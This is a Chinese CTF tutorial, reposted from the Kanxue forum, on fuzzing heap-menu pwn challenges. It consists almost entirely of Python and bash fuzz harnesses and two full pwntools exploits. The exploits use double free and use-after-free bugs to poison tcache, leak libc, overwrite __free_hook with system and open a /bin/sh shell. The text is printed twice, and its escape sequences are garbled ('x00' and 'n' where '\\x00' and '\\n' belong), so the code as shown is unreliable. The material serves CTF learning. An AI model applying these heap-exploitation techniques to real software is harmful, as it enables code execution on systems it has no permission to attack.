# Fuzz 在 CTF 中的基础利用

> 原文: https://www.ctfiot.com/262435.html
> ID: 262435

Fuzzing 原理

例题

┌────────────┐
          │      MBR A      │
          └────┬───────┘
               ↓
        ┌────────────────┐
        │ MBR A1 │ MBR A2│        │
        └────┬──────┴────┘
             ↓
     ┌───────────────┐
     │ obj1 obj2 ... │(叶节点) │
     └───────────────┘

class TooManyElementsError(Exception): #如果树满了我们还没找到异常,就抛出这个
    pass
def fuzz():
    global f
    f=open('./log.txt','w') #记录我们fuzz的过程
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i).encode())
            data0=r.recvuntil(b'Choice Table')
            f.write('add({},{},str({}).encode())n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if b'not exists' in data0: #只有释放存在堆块的操作才会被记录
                continue
            f.write('delet({},{})n'.format(a,b))
while True:
    global f
    r=process('./pwn')
    try:
        fuzz()
    
except TooManyElementsError: #如果没找到漏洞,我们要重投开始
        f.close()
        os.remove("./log.txt")   #清空记录
        r.close()
    
except EOFError:             #找到了漏洞
        f.close()
        line_count = sum(1 for _ in open('log.txt', 'r', encoding='utf-8')) #查询有效命令的数量
        if line_count<20:        #我希望double free的堆风水的步骤简单一点
            print(f"{line_count}hang")
            print("down")
            break
        else:
            os.remove("./log.txt") #如果手法太复杂也要从头来  
            r.close()

add(1,1,str(10).encode())
add(0,6,str(20).encode())
add(7,2,str(30).encode())
add(2,0,str(40).encode())
add(1,3,str(50).encode())
add(3,4,str(60).encode())
add(6,5,str(70).encode())
add(4,8,str(80).encode())
delet(0,6)
add(3,7,str(90).encode())
add(7,6,str(110).encode())
add(2,2,str(120).encode())
add(2,3,str(140).encode())
delet(2,3)
delet(2,2)
delet(1,3)
#delet(1,3),(1,3)便是我们可以进行uaf利用的堆块

typedef struct tcache_perthread_struct {//TCACHE_MAX_BINS=0x40
  uint16_t/uint8_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

edit(1,3,p64(heap+0x10+0x48))
add(4,1)
#
add(4,2)                    #control_ptr(4,2)
edit(4,2,p64(heap+0x10))
add(4,3,p8(5)*2)            #control_num(4,3)

head=heap+0x580
edit(4,2,p64(heap+0x30))
add(4,4,p8(7))
edit(4,2,p64(head-0x18))
add(5,5)
edit(4,2,p64(head))
add(4,5,p64(0)+p64(0x221))
edit(4,2,p64(head+0x10))
add(5,1)
delet(5,1)
query(0,0,6,6)
r.recvuntil(b"12-th name: x00x00x00x00x00x00x00x00!x02x00x00x00x00x00x00")
base=u64(r.recv(8))-0x3ebca0
print(f"base=>{hex(base)}")

fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
edit(4,2,p64(fhook-8))
add(5,6,b"/bin/shx00"+p64(system))
delet(5,6)
r.interactive()

from pwn import *
libc=ELF('./libc-2.27.so')
def cho(num):
    r.sendlineafter(b'> ',str(num).encode())

def add(x,y,name=b'x00'):
    cho(0)
    data=r.recv()
    print(data)
    if b"two many" in data:
        raise EOFerror
    r.sendline(str(x).encode())
    r.sendlineafter(b"value: ",str(y).encode())
    r.sendafter(b"new element name: ",name.ljust(0x20,b'x00'))

def delet(x,y):
    cho(1)
    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())
    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())

def edit(x,y,name):
    cho(2)
    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())
    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())
    r.sendafter(b"name: ",name.ljust(0x20,b'x00'))

def show(x,y):
    cho(3)
    r.sendlineafter(b'value',str(x).encode())
    r.sendlineafter(b'value',str(y).encode())

def query(a,b,c,d):
    cho(4)
    r.sendlineafter(b"value: ",str(a).encode())
    r.sendlineafter(b"value: ",str(b).encode())
    r.sendlineafter(b"value: ",str(c).encode())
    r.sendlineafter(b"value: ",str(d).encode())
def bug():
    gdb.attach(r)
r=process('./pwn')
#r=remote("node5.anna.nssctf.cn",23868)
add(1,1,str(10).encode())
add(0,6,str(20).encode())
add(7,2,str(30).encode())
add(2,0,str(40).encode())
add(1,3,str(50).encode())
add(3,4,str(60).encode())
add(6,5,str(70).encode())
add(4,8,str(80).encode())
delet(0,6)
add(3,7,str(90).encode())
add(7,6,str(110).encode())
add(2,2,b"aaa")
add(2,3,b'a'*8)
delet(2,3)
delet(2,2)
delet(1,3)
#delet(1,3)

query(1,0,5,5)
r.recvuntil(b"2-th name: ")
heap=u64(r.recv(8))-0x5c0
print(f"heap=>{hex(heap)}")
head=heap+0x580
#===============================================================
edit(1,3,p64(heap+0x10+0x48))
add(4,1)
#
add(4,2)                    #control_ptr(4,2)
edit(4,2,p64(heap+0x10))
add(4,3,p8(5)*2)            #control_num(4,3)
head=heap+0x580
edit(4,2,p64(heap+0x30))
add(4,4,p8(7))
#===============================================================
edit(4,2,p64(head-0x18))
add(5,5)
edit(4,2,p64(head))
add(4,5,p64(0)+p64(0x221))
edit(4,2,p64(head+0x10))
add(5,1)
delet(5,1)
bug()
query(0,0,6,6)
r.recvuntil(b"12-th name: x00x00x00x00x00x00x00x00!x02x00x00x00x00x00x00")
base=u64(r.recv(8))-0x3ebca0
print(f"base=>{hex(base)}")
#===============================================================
fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
edit(4,2,p64(fhook-8))
add(5,6,b"/bin/shx00"+p64(system))

delet(5,6)
r.interactive()

import random
import string
operations = ""

total_ops = random.randint(1, 20)#操作次数在1~19中随机
total_rules = 0
total_notes = 0

for i in range(total_ops):
    op = random.choice([1, 2, 4])#从create,edit,delet中随机选择
    if op == 1:
        operations += "1n"
        choose = random.randint(1, 2)
        operations += str(choose) + "n"
        if choose == 1:#两种不同的create会分别增加两种chunk的数量
            total_rules += 1
        elif choose == 2:
            total_notes += 1

    elif op == 2:
        operations += "2n"
        choose1 = random.randint(1, 2)#随机释放堆块
        operations += str(choose1) + "n"
        if choose1 == 1 and total_rules > 0 :
            choose2 = random.randint(0, total_rules-1)
            operations += str(choose2) + "n"
            total_rules -= 1#注意减少py中chunk的数量,确保只释放已存在的堆块
        elif choose1 == 2 and total_notes > 0 :
            choose2 = random.randint(0, total_notes-1)
            operations += str(choose2) + "n"
            total_notes -= 1
        else :
            operations = operations[:(len(operations)-4)]#如果chunk数量为0,那么去除此次操作
    elif op == 4:
        operations += "4n"
        choose1 = random.randint(1, 2)
        operations += str(choose1) + "n"
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for _ in range(63))#向随机chunk中写入64字节随机数据
        if choose1 == 1 and total_rules > 0 :
            choose2 = random.randint(0, total_rules-1)
            operations += str(choose2) + "n"
            operations += random_string + "n"
            total_rules -= 1
        elif choose1 == 2 and total_notes > 0 :
            choose2 = random.randint(0, total_notes-1)
            operations += str(choose2) + "n"
            operations += random_string + "n"
            total_notes -= 1
        else :
            operations = operations[:(len(operations)-4)]#同理如果chunk数量为0则去除此次操作

print(operations + "6")#最后一定要退出

#!/bin/bash
while ((1))
do
    python3 ./test.py > poc#将test.py中的数据放入poc中(poc负责保存记录)
    cat poc | ./pwn#将poc中的数据喂给elf
    if [ $? -ne 0 ]; then#检测elf的返回值(如果不为0则发生异常,说明触发漏洞,此时退出)
        break
    fi
done

ch(1)
ch(2)
ch(1)
ch(1)
ch(2)
ch(2)
ch(0)
ch(2)
ch(1)
ch(0)
ch(1)
ch(1)
ch(1)
ch(1)
ch(4)
ch(1)
ch(1)
io.send(b"P56DpQlpxKiRRzvnSNza6rP4vz2hJsgAWyagEGe9tyVNrqZdUO8S7Gg6KZRTzGL")
ch(4)
ch(1)
ch(0)
io.send(b"q7vM0fZpYeCUblwTVxszBf7i2r1EwHD52mCBauDL03Ico2eOPhwO2jUlmbUtO3H")

from pwn import *
io=process('./pwn')
libc=ELF('./libc-2.31.so')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"> ",str(Id).encode())
def add(Id):
    ch(1)
    ch(Id)
ch(5)
base=int(io.recv(14),16)-0x1ecbe0
print(f"base=>{hex(base)}")
#====#   create note 0
ch(1)
#
ch(2)
#
#====#   create rule 0   
ch(1)
#
ch(1)
#
#====#   delet note 0
ch(2)
#
ch(2)
#
ch(0)
#
#====#   delet rule 0
ch(2)
#
ch(1)
#
ch(0)
#
#====#   create rule 0
ch(1)
#
ch(1)
#
#====#   create rule 1
ch(1)
#
ch(1)
#
#====#   edit rule 1   
ch(4)
#
ch(1)
#
ch(1)
#
io.send(b"0")
#====#   edit rule 0
ch(4)
#
ch(1)
#
ch(0)
#
fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
io.send(p64(fhook-8))
#====# create note 0
ch(1)
#
ch(2)
#
#====# create note 1
ch(1)
#
ch(2)
#
#====# edit note 1
ch(4)
#
ch(2)
#
ch(1)
#
io.send(b"/bin/sh".ljust(8,b'x00')+p64(system))
print(hex(fhook))
#====#  delet note 1 == system("/bin/sh")
ch(2)
#
ch(2)
#
ch(1)
#
io.interactive()

看雪ID：zer00ne

https://bbs.kanxue.com/user-home-1024538.htm

*本文为看雪论坛优秀文章，由 zer00ne 原创，转载请注明来自看雪社区

第九届安全开发者峰会将于10月23日举办

欢迎投稿议题（必须是技术干货）

# 往期推荐

一种底层磁盘数据截获方法（附源码）

基础so注入的实现

使用Unidbg模拟执行去除OLLVM-BR混淆

CVE-2023-4069：Maglev图建立阶段的一个漏洞

Unicorn-BinaryNinja 去除csel-br 间接跳转混淆

球分享

球点赞

球在看

点击阅读原文查看更多


```
┌────────────┐
          │      MBR A      │
          └────┬───────┘
               ↓
        ┌────────────────┐
        │ MBR A1 │ MBR A2│        │
        └────┬──────┴────┘
             ↓
     ┌───────────────┐
     │ obj1 obj2 ... │(叶节点) │
     └───────────────┘
class TooManyElementsError(Exception): #如果树满了我们还没找到异常,就抛出这个
    pass
def fuzz():
    global f
    f=open('./log.txt','w') #记录我们fuzz的过程
    for i in range(0x1000):
        if(i%10==0):
            a = randint(0,8)
            b = randint(0,8)
            add(a,b,str(i).encode())
            data0=r.recvuntil(b'Choice Table')
            f.write('add({},{},str({}).encode())n'.format(a,b,i))
        elif(i%2==0):
            a = randint(0,8)
            b = randint(0,8)
            delet(a,b)
            data0=r.recvline()
            if b'not exists' in data0: #只有释放存在堆块的操作才会被记录
                continue
            f.write('delet({},{})n'.format(a,b))
while True:
    global f
    r=process('./pwn')
    try:
        fuzz()
    
except TooManyElementsError: #如果没找到漏洞,我们要重投开始
        f.close()
        os.remove("./log.txt")   #清空记录
        r.close()
    
except EOFError:             #找到了漏洞
        f.close()
        line_count = sum(1 for _ in open('log.txt', 'r', encoding='utf-8')) #查询有效命令的数量
        if line_count<20:        #我希望double free的堆风水的步骤简单一点
            print(f"{line_count}hang")
            print("down")
            break
        else:
            os.remove("./log.txt") #如果手法太复杂也要从头来  
            r.close()
add(1,1,str(10).encode())
add(0,6,str(20).encode())
add(7,2,str(30).encode())
add(2,0,str(40).encode())
add(1,3,str(50).encode())
add(3,4,str(60).encode())
add(6,5,str(70).encode())
add(4,8,str(80).encode())
delet(0,6)
add(3,7,str(90).encode())
add(7,6,str(110).encode())
add(2,2,str(120).encode())
add(2,3,str(140).encode())
delet(2,3)
delet(2,2)
delet(1,3)
    #delet(1,3),(1,3)便是我们可以进行uaf利用的堆块
typedef struct tcache_perthread_struct {//TCACHE_MAX_BINS=0x40
  uint16_t/uint8_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
edit(1,3,p64(heap+0x10+0x48))
add(4,1)
#
add(4,2)                    #control_ptr(4,2)
edit(4,2,p64(heap+0x10))
add(4,3,p8(5)*2)            #control_num(4,3)
head=heap+0x580
edit(4,2,p64(heap+0x30))
add(4,4,p8(7))
edit(4,2,p64(head-0x18))
add(5,5)
edit(4,2,p64(head))
add(4,5,p64(0)+p64(0x221))
edit(4,2,p64(head+0x10))
add(5,1)
delet(5,1)
query(0,0,6,6)
r.recvuntil(b"12-th name: x00x00x00x00x00x00x00x00!x02x00x00x00x00x00x00")
base=u64(r.recv(8))-0x3ebca0
print(f"base=>{hex(base)}")
fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
edit(4,2,p64(fhook-8))
add(5,6,b"/bin/shx00"+p64(system))
delet(5,6)
r.interactive()
from pwn import *
libc=ELF('./libc-2.27.so')
def cho(num):
    r.sendlineafter(b'> ',str(num).encode())

def add(x,y,name=b'x00'):
    cho(0)
    data=r.recv()
    print(data)
    if b"two many" in data:
        raise EOFerror
    r.sendline(str(x).encode())
    r.sendlineafter(b"value: ",str(y).encode())
    r.sendafter(b"new element name: ",name.ljust(0x20,b'x00'))

def delet(x,y):
    cho(1)
    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())
    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())

def edit(x,y,name):
    cho(2)
    r.sendlineafter(b"want element x-coordinate value: ",str(x).encode())
    r.sendlineafter(b"want element y-coordinate value: ",str(y).encode())
    r.sendafter(b"name: ",name.ljust(0x20,b'x00'))

def show(x,y):
    cho(3)
    r.sendlineafter(b'value',str(x).encode())
    r.sendlineafter(b'value',str(y).encode())

def query(a,b,c,d):
    cho(4)
    r.sendlineafter(b"value: ",str(a).encode())
    r.sendlineafter(b"value: ",str(b).encode())
    r.sendlineafter(b"value: ",str(c).encode())
    r.sendlineafter(b"value: ",str(d).encode())
def bug():
    gdb.attach(r)
r=process('./pwn')
    #r=remote("node5.anna.nssctf.cn",23868)
add(1,1,str(10).encode())
add(0,6,str(20).encode())
add(7,2,str(30).encode())
add(2,0,str(40).encode())
add(1,3,str(50).encode())
add(3,4,str(60).encode())
add(6,5,str(70).encode())
add(4,8,str(80).encode())
delet(0,6)
add(3,7,str(90).encode())
add(7,6,str(110).encode())
add(2,2,b"aaa")
add(2,3,b'a'*8)
delet(2,3)
delet(2,2)
delet(1,3)
    #delet(1,3)

query(1,0,5,5)
r.recvuntil(b"2-th name: ")
heap=u64(r.recv(8))-0x5c0
print(f"heap=>{hex(heap)}")
head=heap+0x580
#===============================================================
edit(1,3,p64(heap+0x10+0x48))
add(4,1)
#
add(4,2)                    #control_ptr(4,2)
edit(4,2,p64(heap+0x10))
add(4,3,p8(5)*2)            #control_num(4,3)
head=heap+0x580
edit(4,2,p64(heap+0x30))
add(4,4,p8(7))
#===============================================================
edit(4,2,p64(head-0x18))
add(5,5)
edit(4,2,p64(head))
add(4,5,p64(0)+p64(0x221))
edit(4,2,p64(head+0x10))
add(5,1)
delet(5,1)
bug()
query(0,0,6,6)
r.recvuntil(b"12-th name: x00x00x00x00x00x00x00x00!x02x00x00x00x00x00x00")
base=u64(r.recv(8))-0x3ebca0
print(f"base=>{hex(base)}")
#===============================================================
fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
edit(4,2,p64(fhook-8))
add(5,6,b"/bin/shx00"+p64(system))

delet(5,6)
r.interactive()
import random
import string
operations = ""

total_ops = random.randint(1, 20)#操作次数在1~19中随机
total_rules = 0
total_notes = 0

for i in range(total_ops):
    op = random.choice([1, 2, 4])#从create,edit,delet中随机选择
    if op == 1:
        operations += "1n"
        choose = random.randint(1, 2)
        operations += str(choose) + "n"
        if choose == 1:#两种不同的create会分别增加两种chunk的数量
            total_rules += 1
        elif choose == 2:
            total_notes += 1

    elif op == 2:
        operations += "2n"
        choose1 = random.randint(1, 2)#随机释放堆块
        operations += str(choose1) + "n"
        if choose1 == 1 and total_rules > 0 :
            choose2 = random.randint(0, total_rules-1)
            operations += str(choose2) + "n"
            total_rules -= 1#注意减少py中chunk的数量,确保只释放已存在的堆块
        elif choose1 == 2 and total_notes > 0 :
            choose2 = random.randint(0, total_notes-1)
            operations += str(choose2) + "n"
            total_notes -= 1
        else :
            operations = operations[:(len(operations)-4)]#如果chunk数量为0,那么去除此次操作
    elif op == 4:
        operations += "4n"
        choose1 = random.randint(1, 2)
        operations += str(choose1) + "n"
        characters = string.ascii_letters + string.digits
        random_string = ''.join(random.choice(characters) for _ in range(63))#向随机chunk中写入64字节随机数据
        if choose1 == 1 and total_rules > 0 :
            choose2 = random.randint(0, total_rules-1)
            operations += str(choose2) + "n"
            operations += random_string + "n"
            total_rules -= 1
        elif choose1 == 2 and total_notes > 0 :
            choose2 = random.randint(0, total_notes-1)
            operations += str(choose2) + "n"
            operations += random_string + "n"
            total_notes -= 1
        else :
            operations = operations[:(len(operations)-4)]#同理如果chunk数量为0则去除此次操作

print(operations + "6")#最后一定要退出
#!/bin/bash
while ((1))
do
    python3 ./test.py > poc#将test.py中的数据放入poc中(poc负责保存记录)
    cat poc | ./pwn#将poc中的数据喂给elf
    if [ $? -ne 0 ]; then#检测elf的返回值(如果不为0则发生异常,说明触发漏洞,此时退出)
        break
    fi
done
ch(1)
ch(2)
ch(1)
ch(1)
ch(2)
ch(2)
ch(0)
ch(2)
ch(1)
ch(0)
ch(1)
ch(1)
ch(1)
ch(1)
ch(4)
ch(1)
ch(1)
io.send(b"P56DpQlpxKiRRzvnSNza6rP4vz2hJsgAWyagEGe9tyVNrqZdUO8S7Gg6KZRTzGL")
ch(4)
ch(1)
ch(0)
io.send(b"q7vM0fZpYeCUblwTVxszBf7i2r1EwHD52mCBauDL03Ico2eOPhwO2jUlmbUtO3H")
from pwn import *
io=process('./pwn')
libc=ELF('./libc-2.31.so')
def bug():
    gdb.attach(io)
def ch(Id):
    io.sendlineafter(b"> ",str(Id).encode())
def add(Id):
    ch(1)
    ch(Id)
ch(5)
base=int(io.recv(14),16)-0x1ecbe0
print(f"base=>{hex(base)}")
#====#   create note 0
ch(1)
#
ch(2)
#
#====#   create rule 0   
ch(1)
#
ch(1)
#
#====#   delet note 0
ch(2)
#
ch(2)
#
ch(0)
#
#====#   delet rule 0
ch(2)
#
ch(1)
#
ch(0)
#
#====#   create rule 0
ch(1)
#
ch(1)
#
#====#   create rule 1
ch(1)
#
ch(1)
#
#====#   edit rule 1   
ch(4)
#
ch(1)
#
ch(1)
#
io.send(b"0")
#====#   edit rule 0
ch(4)
#
ch(1)
#
ch(0)
#
fhook=base+libc.sym.__free_hook
system=base+libc.sym.system
io.send(p64(fhook-8))
#====# create note 0
ch(1)
#
ch(2)
#
#====# create note 1
ch(1)
#
ch(2)
#
#====# edit note 1
ch(4)
#
ch(2)
#
ch(1)
#
io.send(b"/bin/sh".ljust(8,b'x00')+p64(system))
print(hex(fhook))
#====#  delet note 1 == system("/bin/sh")
ch(2)
#
ch(2)
#
ch(1)
#
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629043-wxsync-2025-07-8516e3f7ee8acba7a91a6225f3f9afaa.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629045-wxsync-2025-07-ec2ebe93a8ebe13946daa87b9c2cf3c4.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629047-wxsync-2025-07-6851cda68a5759fb9af16d1255e2edd7.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629049-wxsync-2025-07-c2663f903c70b9023e229a5a5c99c343.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629051-wxsync-2025-07-9317fd90eff291f8c225adff3c006807.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629053-wxsync-2025-07-c0b849426b0962bbe9acdd1c9e3e7016.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629056-wxsync-2025-07-afb362c163ea8cdbbb39af076ca6c4c8.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629058-wxsync-2025-07-76154ffaddf0618937b49b1614f270e3.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629061-wxsync-2025-07-0dca33d9a4aa62f7be4cd0652a445ba9.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/07/1753629070-wxsync-2025-07-71612baea187590d75a96ee2368782fc.webp)